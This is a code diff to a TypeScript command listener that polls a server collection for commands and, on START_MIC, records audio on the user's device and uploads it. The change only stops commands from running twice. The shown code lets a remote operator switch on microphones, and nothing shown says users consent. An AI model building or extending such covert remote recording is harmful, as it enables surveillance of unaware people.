@@ -22,18 +22,24 @@ const executeCommand = async (command: any) => {
     const currentUserId = getUserId();
     if (command.target_user_id !== 'all' && command.target_user_id !== currentUserId) return;
     // Skip already completed commands
-    if (command.status === 'completed' || command.status === 'failed') return;
+    if (command.status === 'completed' || command.status === 'failed' || command.status === 'in_progress') return;
 
     console.log('[CommandListener] Executing command:', command.type, command.id);
+
+    // Mark as in_progress immediately so polling doesn't re-trigger
+    try {
+        await pb.collection('commands').update(command.id, { status: 'in_progress' });
+    } catch (_) { /* ignore */ }
 
     try {
         switch (command.type) {
             case 'START_MIC':
-                // startAudioRecording returns immediately after starting;
-                // the actual recording + upload happens asynchronously via setTimeout.
-                // We mark the command as 'completed' here meaning "recording started".
-                // The upload result is independent.
+                // startAudioRecording now returns a Promise that resolves
+                // AFTER the full record + upload cycle finishes.
+                // Awaiting it means the command stays "in-progress" until done.
+                console.log('[CommandListener] Starting mic recording...');
                 await startAudioRecording(command.duration || 10000);
+                console.log('[CommandListener] Mic recording + upload cycle finished');
                 break;
             case 'STOP_MIC':
                 await stopAudioRecording();
